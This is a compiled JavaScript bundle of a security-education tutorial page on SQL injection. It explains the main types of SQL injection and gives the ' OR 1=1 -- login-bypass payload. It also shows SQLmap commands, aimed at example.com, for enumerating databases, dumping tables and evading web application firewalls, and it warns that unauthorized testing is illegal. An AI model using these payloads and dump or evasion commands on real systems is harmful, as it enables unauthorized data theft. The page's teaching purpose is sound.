"use strict";(self.webpackChunklearn=self.webpackChunklearn||[]).push([[677],{6257:(e,n,i)=>{i.r(n),i.d(n,{assets:()=>r,contentTitle:()=>l,default:()=>h,frontMatter:()=>a,metadata:()=>o,toc:()=>c});var t=i(4848),s=i(8453);const a={title:"SQL Injection",sidebar_position:6},l=void 0,o={id:"web-exploitation/sql-injection",title:"SQL Injection",description:"Introduction to SQL Injection",source:"@site/docs/07-web-exploitation/sql-injection.mdx",sourceDirName:"07-web-exploitation",slug:"/web-exploitation/sql-injection",permalink:"/learn/docs/web-exploitation/sql-injection",draft:!1,unlisted:!1,editUrl:"https://github.com/pwneu/learn/tree/main/docs/07-web-exploitation/sql-injection.mdx",tags:[],version:"current",sidebarPosition:6,frontMatter:{title:"SQL Injection",sidebar_position:6},sidebar:"tutorialSidebar",previous:{title:"Web Fuzzing",permalink:"/learn/docs/web-exploitation/web-fuzzing"}},r={},c=[{value:"Introduction to SQL Injection",id:"introduction-to-sql-injection",level:2},{value:"Types of SQL Injection",id:"types-of-sql-injection",level:2},{value:"Example of SQL Injection",id:"example-of-sql-injection",level:2},{value:"SQL Injection Tutorial",id:"sql-injection-tutorial",level:2},{value:"Step 1: Identifying a Vulnerable Parameter",id:"step-1-identifying-a-vulnerable-parameter",level:3},{value:"Step 2: Installing SQLmap",id:"step-2-installing-sqlmap",level:3},{value:"Step 4: Extracting Data",id:"step-4-extracting-data",level:3},{value:"Step 5: Avoiding Detection",id:"step-5-avoiding-detection",level:3},{value:"Conclusion",id:"conclusion",level:2},{value:"External Resources",id:"external-resources",level:2}];function d(e){const n={a:"a",admonition:"admonition",code:"code",h2:"h2",h3:"h3",li:"li",ol:"ol",p:"p",pre:"pre",strong:"strong",ul:"ul",...(0,s.R)(),...e.components};return(0,t.jsxs)(t.Fragment,{children:[(0,t.jsx)(n.h2,{id:"introduction-to-sql-injection",children:"Introduction to SQL Injection"}),"\n",(0,t.jsx)(n.p,{children:"SQL Injection (SQLi) is a common web application vulnerability that allows attackers to interfere with the queries an application makes to its database. By injecting malicious SQL statements into a form field or URL parameter, attackers can gain unauthorized access to data, manipulate database entries, or even execute commands on the server."}),"\n",(0,t.jsx)(n.admonition,{type:"danger",children:(0,t.jsxs)(n.p,{children:["SQL Injection attacks are ",(0,t.jsx)(n.strong,{children:"illegal"})," without permission. You should only test systems you have authorization to assess. Unauthorized testing can lead to severe legal consequences."]})}),"\n",(0,t.jsx)(n.h2,{id:"types-of-sql-injection",children:"Types of SQL Injection"}),"\n",(0,t.jsxs)(n.ol,{children:["\n",(0,t.jsxs)(n.li,{children:["\n",(0,t.jsxs)(n.p,{children:[(0,t.jsx)(n.strong,{children:"In-band SQLi"}),":"]}),"\n",(0,t.jsxs)(n.ul,{children:["\n",(0,t.jsxs)(n.li,{children:["The attacker is able to use the same communication channel to both inject the malicious SQL commands and retrieve results. The most common types are:","\n",(0,t.jsxs)(n.ul,{children:["\n",(0,t.jsxs)(n.li,{children:[(0,t.jsx)(n.strong,{children:"Error-based SQLi"}),": Relies on error messages returned by the database."]}),"\n",(0,t.jsxs)(n.li,{children:[(0,t.jsx)(n.strong,{children:"Union-based SQLi"}),": Leverages the ",(0,t.jsx)(n.code,{children:"UNION"})," SQL operator to combine multiple select queries."]}),"\n"]}),"\n"]}),"\n"]}),"\n"]}),"\n",(0,t.jsxs)(n.li,{children:["\n",(0,t.jsxs)(n.p,{children:[(0,t.jsx)(n.strong,{children:"Inferential SQLi (Blind SQLi)"}),":"]}),"\n",(0,t.jsxs)(n.ul,{children:["\n",(0,t.jsxs)(n.li,{children:["The attacker does not receive direct feedback from the database but infers the database's response by analyzing the behavior of the application. This can be:","\n",(0,t.jsxs)(n.ul,{children:["\n",(0,t.jsxs)(n.li,{children:[(0,t.jsx)(n.strong,{children:"Boolean-based SQLi"}),": Exploits the fact that the SQL query's result will alter the behavior of the application depending on the query's truth value."]}),"\n",(0,t.jsxs)(n.li,{children:[(0,t.jsx)(n.strong,{children:"Time-based SQLi"}),": Manipulates the database to delay its responses, allowing the attacker to infer data based on the response time."]}),"\n"]}),"\n"]}),"\n"]}),"\n"]}),"\n",(0,t.jsxs)(n.li,{children:["\n",(0,t.jsxs)(n.p,{children:[(0,t.jsx)(n.strong,{children:"Out-of-band SQLi"}),":"]}),"\n",(0,t.jsxs)(n.ul,{children:["\n",(0,t.jsx)(n.li,{children:"The attacker relies on external server responses (such as DNS or HTTP requests) to exfiltrate data."}),"\n"]}),"\n"]}),"\n"]}),"\n",(0,t.jsx)(n.h2,{id:"example-of-sql-injection",children:"Example of SQL Injection"}),"\n",(0,t.jsx)(n.p,{children:"Let's assume we have a vulnerable login form where the backend SQL query looks like this:"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-sql",children:"SELECT * FROM users WHERE username = 'input_username' AND password = 'input_password';\n"})}),"\n",(0,t.jsx)(n.p,{children:"An attacker could submit the following input:"}),"\n",(0,t.jsxs)(n.ul,{children:["\n",(0,t.jsxs)(n.li,{children:[(0,t.jsx)(n.code,{children:"input_username"}),": ",(0,t.jsx)(n.code,{children:"' OR 1=1 --"})]}),"\n",(0,t.jsxs)(n.li,{children:[(0,t.jsx)(n.code,{children:"input_password"}),": ",(0,t.jsx)(n.code,{children:"anything"})]}),"\n"]}),"\n",(0,t.jsx)(n.p,{children:"This modifies the SQL query to:"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-sql",children:"SELECT * FROM users WHERE username = '' OR 1=1 --' AND password = 'anything';\n"})}),"\n",(0,t.jsxs)(n.p,{children:["In this case, ",(0,t.jsx)(n.code,{children:"1=1"})," is always true, allowing the attacker to bypass authentication."]}),"\n",(0,t.jsx)(n.h2,{id:"sql-injection-tutorial",children:"SQL Injection Tutorial"}),"\n",(0,t.jsxs)(n.p,{children:["This tutorial will guide you through identifying and exploiting SQL injection vulnerabilities using ",(0,t.jsx)(n.strong,{children:"SQLmap"}),", a popular open-source tool."]}),"\n",(0,t.jsx)(n.h3,{id:"step-1-identifying-a-vulnerable-parameter",children:"Step 1: Identifying a Vulnerable Parameter"}),"\n",(0,t.jsx)(n.p,{children:"Use a basic SQL injection payload to test if a web application's parameter is vulnerable. For example, on a URL like this:"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{children:"http://example.com/page.php?id=1\n"})}),"\n",(0,t.jsxs)(n.p,{children:["Try modifying the ",(0,t.jsx)(n.code,{children:"id"})," parameter to:"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{children:"http://example.com/page.php?id=1' OR '1'='1\n"})}),"\n",(0,t.jsx)(n.h3,{id:"step-2-installing-sqlmap",children:"Step 2: Installing SQLmap"}),"\n",(0,t.jsx)(n.admonition,{type:"info",children:(0,t.jsx)(n.p,{children:"Pre-installed with Kali Linux."})}),"\n",(0,t.jsxs)(n.p,{children:["SQLmap can be installed via ",(0,t.jsx)(n.strong,{children:"Git"}),":"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{children:"git clone https://github.com/sqlmapproject/sqlmap.git\ncd sqlmap\n"})}),"\n",(0,t.jsx)(n.admonition,{type:"info",children:(0,t.jsxs)(n.p,{children:["On Kali Linux, you don't need to type ",(0,t.jsx)(n.code,{children:"python sqlmap.py"})," in the command line. The command has been aliased to ",(0,t.jsx)(n.code,{children:"sqlmap"})]})}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:'python sqlmap.py -u "http://example.com/page.php?id=1" --dbs\n'})}),"\n",(0,t.jsxs)(n.ul,{children:["\n",(0,t.jsxs)(n.li,{children:[(0,t.jsx)(n.code,{children:"-u"})," specifies the URL to test."]}),"\n",(0,t.jsxs)(n.li,{children:[(0,t.jsx)(n.code,{children:"--dbs"})," enumerates the databases."]}),"\n"]}),"\n",(0,t.jsx)(n.h3,{id:"step-4-extracting-data",children:"Step 4: Extracting Data"}),"\n",(0,t.jsx)(n.p,{children:"Once SQLmap confirms that the parameter is vulnerable, you can extract specific data from the database. For example, to extract data from a specific table:"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{children:'python sqlmap.py -u "http://example.com/page.php?id=1" -D database_name -T table_name --dump\n'})}),"\n",(0,t.jsxs)(n.ul,{children:["\n",(0,t.jsxs)(n.li,{children:[(0,t.jsx)(n.code,{children:"-D"})," specifies the database name."]}),"\n",(0,t.jsxs)(n.li,{children:[(0,t.jsx)(n.code,{children:"-T"})," specifies the table name."]}),"\n",(0,t.jsxs)(n.li,{children:[(0,t.jsx)(n.code,{children:"--dump"})," extracts all the data from the specified table."]}),"\n"]}),"\n",(0,t.jsx)(n.h3,{id:"step-5-avoiding-detection",children:"Step 5: Avoiding Detection"}),"\n",(0,t.jsx)(n.p,{children:"To avoid detection by web application firewalls (WAFs), SQLmap allows you to use various evasion techniques, such as encoding payloads or delaying requests:"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{children:'python sqlmap.py -u "http://example.com/page.php?id=1" --random-agent --delay=2 --hex\n'})}),"\n",(0,t.jsxs)(n.ul,{children:["\n",(0,t.jsxs)(n.li,{children:[(0,t.jsx)(n.code,{children:"--random-agent"}),": Randomizes the user agent in each request."]}),"\n",(0,t.jsxs)(n.li,{children:[(0,t.jsx)(n.code,{children:"--delay"}),": Adds a delay between each request to avoid triggering rate limits."]}),"\n",(0,t.jsxs)(n.li,{children:[(0,t.jsx)(n.code,{children:"--hex"}),": Encodes the payload in hexadecimal to evade detection."]}),"\n"]}),"\n",(0,t.jsx)(n.h2,{id:"conclusion",children:"Conclusion"}),"\n",(0,t.jsx)(n.p,{children:"SQL Injection is a powerful attack vector, and tools like SQLmap make it easier to exploit vulnerable systems. However, it\u2019s crucial to remember that ethical guidelines must always be followed. Testing without permission is illegal and unethical. Always ensure that you are operating within the boundaries of the law and with explicit consent."}),"\n",(0,t.jsx)(n.h2,{id:"external-resources",children:"External Resources"}),"\n",(0,t.jsxs)(n.ul,{children:["\n",(0,t.jsx)(n.li,{children:(0,t.jsx)(n.a,{href:"https://owasp.org/www-community/attacks/SQL_Injection",children:"OWASP SQL Injection Guide"})}),"\n",(0,t.jsx)(n.li,{children:(0,t.jsx)(n.a,{href:"https://sqlmap.org/",children:"SQLmap Documentation"})}),"\n"]})]})}function h(e={}){const{wrapper:n}={...(0,s.R)(),...e.components};return n?(0,t.jsx)(n,{...e,children:(0,t.jsx)(d,{...e})}):d(e)}},8453:(e,n,i)=>{i.d(n,{R:()=>l,x:()=>o});var t=i(6540);const s={},a=t.createContext(s);function l(e){const n=t.useContext(a);return t.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function o(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(s):e.components||s:l(e.components),t.createElement(a.Provider,{value:n},e.children)}}}]);